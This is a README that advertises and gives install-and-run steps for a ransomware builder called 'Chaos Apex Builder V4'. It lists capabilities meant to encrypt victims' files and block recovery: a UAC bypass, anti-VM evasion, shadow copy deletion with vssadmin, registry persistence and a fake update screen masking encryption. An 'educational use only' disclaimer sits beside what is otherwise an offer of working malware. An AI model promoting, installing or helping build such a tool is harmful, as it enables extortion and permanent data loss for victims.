🚀 Chaos Apex Builder V4

The ultimate open-source ransomware builder for educational purposes only. Generate customized encryptors and decryptors with advanced evasion techniques.

Step by Step install

git clone https://github.com/Voltex0000/Ransomware-py.git

cd Ransomware-py

Using venv to to install pip requirements.txt

python3 -m venv venv

source venv/bin/activate

pip install -r requirements.txt

python Ransomware.py
                  OR
python3 Ransomware.py

⚠️ DISCLAIMER

This tool is for EDUCATIONAL USE ONLY. The developers are not responsible for any damage caused by misuse. Use this to understand malware mechanics and improve your defenses.




✨ Features

    Advanced Encryption: AES-256 standard via cryptography library.
    Massive Target List: Encrypts over 200 file types including documents, media, databases, and backups.
    Custom Ransomware Note: Fully customizable popup window and text file messages.
    UAC Bypass: Includes Event Viewer UAC bypass logic (Windows 10/11).
    Anti-VM: Detects virtual environments (VMware, VirtualBox) to avoid analysis.
    Shadow Copy Deletion: Permanently destroys Windows System Restore points using vssadmin.
    Persistence: Adds payload to Windows Startup registry.
    Fake Update: Displays a "Working on updates" screen during encryption.
    One-Click Compilation: Built-in PyInstaller integration to generate .exe files instantly.
